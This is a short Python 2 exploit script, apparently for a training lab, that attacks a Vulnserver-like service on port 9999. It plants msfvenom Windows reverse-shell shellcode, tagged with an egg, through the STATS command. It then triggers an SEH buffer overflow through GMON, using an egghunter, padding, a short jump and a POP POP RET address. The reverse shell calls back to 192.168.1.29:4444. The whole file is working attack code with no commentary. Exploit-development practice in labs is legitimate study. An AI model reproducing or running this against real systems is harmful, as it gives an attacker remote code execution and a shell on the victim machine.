#!/usr/bin/python

import os
import sys
import socket

# JMP ESP: 625011AF 

# msfvenom --platform windows -a x86 -p windows/shell_reverse_tcp LHOST=192.168.1.29 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
shellcode = (
"W00TW00T"
"\xb8\xb5\xd3\x55\xa3\xda\xc0\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x83\xea\xfc\x31\x42\x0e\x03\xf7\xdd\xb7\x56\x0b\x09\xb5"
"\x99\xf3\xca\xda\x10\x16\xfb\xda\x47\x53\xac\xea\x0c\x31\x41"
"\x80\x41\xa1\xd2\xe4\x4d\xc6\x53\x42\xa8\xe9\x64\xff\x88\x68"
"\xe7\x02\xdd\x4a\xd6\xcc\x10\x8b\x1f\x30\xd8\xd9\xc8\x3e\x4f"
"\xcd\x7d\x0a\x4c\x66\xcd\x9a\xd4\x9b\x86\x9d\xf5\x0a\x9c\xc7"
"\xd5\xad\x71\x7c\x5c\xb5\x96\xb9\x16\x4e\x6c\x35\xa9\x86\xbc"
"\xb6\x06\xe7\x70\x45\x56\x20\xb6\xb6\x2d\x58\xc4\x4b\x36\x9f"
"\xb6\x97\xb3\x3b\x10\x53\x63\xe7\xa0\xb0\xf2\x6c\xae\x7d\x70"
"\x2a\xb3\x80\x55\x41\xcf\x09\x58\x85\x59\x49\x7f\x01\x01\x09"
"\x1e\x10\xef\xfc\x1f\x42\x50\xa0\x85\x09\x7d\xb5\xb7\x50\xea"
"\x7a\xfa\x6a\xea\x14\x8d\x19\xd8\xbb\x25\xb5\x50\x33\xe0\x42"
"\x96\x6e\x54\xdc\x69\x91\xa5\xf5\xad\xc5\xf5\x6d\x07\x66\x9e"
"\x6d\xa8\xb3\x31\x3d\x06\x6c\xf2\xed\xe6\xdc\x9a\xe7\xe8\x03"
"\xba\x08\x23\x2c\x51\xf3\xa4\x93\x0e\xfa\x29\x7c\x4d\xfc\x40"
"\x20\xd8\x1a\x08\xc8\x8c\xb5\xa5\x71\x95\x4d\x57\x7d\x03\x28"
"\x57\xf5\xa0\xcd\x16\xfe\xcd\xdd\xcf\x0e\x98\xbf\x46\x10\x36"
"\xd7\x05\x83\xdd\x27\x43\xb8\x49\x70\x04\x0e\x80\x14\xb8\x29"
"\x3a\x0a\x41\xaf\x05\x8e\x9e\x0c\x8b\x0f\x52\x28\xaf\x1f\xaa"
"\xb1\xeb\x4b\x62\xe4\xa5\x25\xc4\x5e\x04\x9f\x9e\x0d\xce\x77"
"\x66\x7e\xd1\x01\x67\xab\xa7\xed\xd6\x02\xfe\x12\xd6\xc2\xf6"
"\x6b\x0a\x73\xf8\xa6\x8e\x93\x1b\x62\xfb\x3b\x82\xe7\x46\x26"
"\x35\xd2\x85\x5f\xb6\xd6\x75\xa4\xa6\x93\x70\xe0\x60\x48\x09"
"\x79\x05\x6e\xbe\x7a\x0c")

# 32 bit egghunter shellcode
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"
"\x74\xef\xb8\x57\x30\x30\x54\x89\xd7\xaf\x75\xea\xaf\x75\xe7"
"\xff\xe7")

payload = ''
payload += 'A' * 3447
payload += '\x90' * 16
payload += egghunter
payload += '\xeb\xce\x90\x90'
payload += '\xb3\x11\x50\x62' # POP POP RET
payload += 'C' * (5000 - len(payload))

connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect.connect(('192.168.1.30',9999))
print connect.recv(1024)
connect.send('STATS ' + shellcode + '\r\n')
connect.recv(1024)
connect.close()

# Send the 1st stage payload to the GMON command
connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect.connect(('192.168.1.30',9999))
print connect.recv(1024)
connect.send('GMON /.:/' + payload + '\r\n')
connect.recv(1024)
connect.close()